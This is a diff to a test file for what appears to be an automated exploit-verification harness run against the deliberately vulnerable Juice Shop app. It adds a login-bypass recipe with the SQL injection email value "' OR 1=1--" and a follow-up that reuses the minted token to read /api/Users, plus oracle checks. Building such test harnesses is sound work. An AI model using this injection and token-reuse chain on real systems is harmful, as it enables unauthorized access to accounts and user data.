@@ -27,11 +27,11 @@ test("a recognized target name with an unrecognized config shape gets no recipes
   assert.deepEqual(getRecipesForTarget({ name: "juice-shop-v17.3.0", config: "nope" }), []);
 });
 
-test("juice-shop-v17.3.0 returns exactly the one recipe whose oracle is fully provable today", () => {
+test("juice-shop-v17.3.0 returns both recipes now that each oracle is fully provable", () => {
   const recipes = getRecipesForTarget({ name: "juice-shop-v17.3.0", config: CONFIG });
   assert.deepEqual(
     recipes.map((r) => r.id),
-    ["juice-shop-sqli-search"],
+    ["juice-shop-sqli-search", "juice-shop-login-bypass"],
   );
 });
 
@@ -121,4 +121,101 @@ test("sqli-search oracle: a JSON error response containing the canary is false",
   const body = JSON.stringify({ data: [{ name: canary }] });
 
   assert.equal(await sqli.oracleCheck({ status: 500, body }, canary), false);
+});
+
+function loginBypassRecipe() {
+  const [, loginBypass] = getRecipesForTarget({ name: "juice-shop-v17.3.0", config: CONFIG });
+  return loginBypass;
+}
+
+test("login-bypass negative control and exploit match decisions.md Q18 exactly", () => {
+  const recipe = loginBypassRecipe();
+
+  assert.deepEqual(recipe.negativeControl, {
+    method: "POST",
+    path: "/rest/user/login",
+    body: { email: "{{canary}}", password: "definitely-the-wrong-password" },
+  });
+  assert.deepEqual(recipe.negativeControlAcceptedStatuses, [401]);
+
+  assert.deepEqual(recipe.exploit, {
+    method: "POST",
+    path: "/rest/user/login",
+    body: { email: "' OR 1=1--", password: "x" },
+  });
+});
+
+test("login-bypass negative-control oracle: a rejected login (no token) is false", () => {
+  const recipe = loginBypassRecipe();
+  const canary = freshCanary();
+  const body = JSON.stringify({ status: 401, message: "Invalid email or password" });
+
+  assert.equal(recipe.oracleCheck({ status: 401, body }, canary), false);
+});
+
+test("login-bypass negative-control oracle: a token in the response is true", () => {
+  const recipe = loginBypassRecipe();
+  const canary = freshCanary();
+  const body = JSON.stringify({ authentication: { token: "a.jwt.token", bid: 1, umail: canary } });
+
+  assert.equal(recipe.oracleCheck({ status: 200, body }, canary), true);
+});
+
+test("login-bypass follow-up: buildRequest extracts the token as a Bearer header against /api/Users", () => {
+  const recipe = loginBypassRecipe();
+  const exploitResponse = {
+    status: 200,
+    body: JSON.stringify({ authentication: { token: "minted-jwt", bid: 1, umail: "admin@juice-sh.op" } }),
+  };
+
+  assert.deepEqual(recipe.exploitFollowUp?.buildRequest(exploitResponse), {
+    method: "GET",
+    path: "/api/Users",
+    headers: { Authorization: "Bearer minted-jwt" },
+  });
+});
+
+test("login-bypass follow-up: buildRequest returns undefined when the exploit minted no token", () => {
+  const recipe = loginBypassRecipe();
+
+  assert.equal(
+    recipe.exploitFollowUp?.buildRequest({ status: 401, body: JSON.stringify({ message: "Invalid email or password" }) }),
+    undefined,
+  );
+  assert.equal(recipe.exploitFollowUp?.buildRequest({ status: 200, body: "not json" }), undefined);
+  assert.equal(recipe.exploitFollowUp?.buildRequest({ status: 200, body: JSON.stringify({}) }), undefined);
+});
+
+test("login-bypass follow-up oracle: this run's canary in /api/Users proves the token grants access", async () => {
+  const recipe = loginBypassRecipe();
+  const canary = freshCanary();
+  const body = JSON.stringify({
+    status: "success",
+    data: [
+      { id: 1, email: "admin@juice-sh.op", role: "admin" },
+      { id: 2, email: canary, role: "customer" },
+    ],
+  });
+
+  assert.equal(await recipe.exploitFollowUp?.oracleCheck({ status: 200, body }, canary), true);
+});
+
+test("login-bypass follow-up oracle: a token that opens /api/Users but without this run's canary is false", async () => {
+  // This is exactly the case the withheld "was any token minted" check couldn't distinguish:
+  // a real admin dump came back, but not proven to be *this run's* canary-linked proof.
+  const recipe = loginBypassRecipe();
+  const canary = freshCanary();
+  const body = JSON.stringify({
+    status: "success",
+    data: [{ id: 1, email: "admin@juice-sh.op", role: "admin" }],
+  });
+
+  assert.equal(await recipe.exploitFollowUp?.oracleCheck({ status: 200, body }, canary), false);
+});
+
+test("login-bypass follow-up oracle: a non-JSON /api/Users response does not throw and is false", async () => {
+  const recipe = loginBypassRecipe();
+  const canary = freshCanary();
+
+  assert.equal(await recipe.exploitFollowUp?.oracleCheck({ status: 200, body: "<html>nope</html>" }, canary), false);
 });
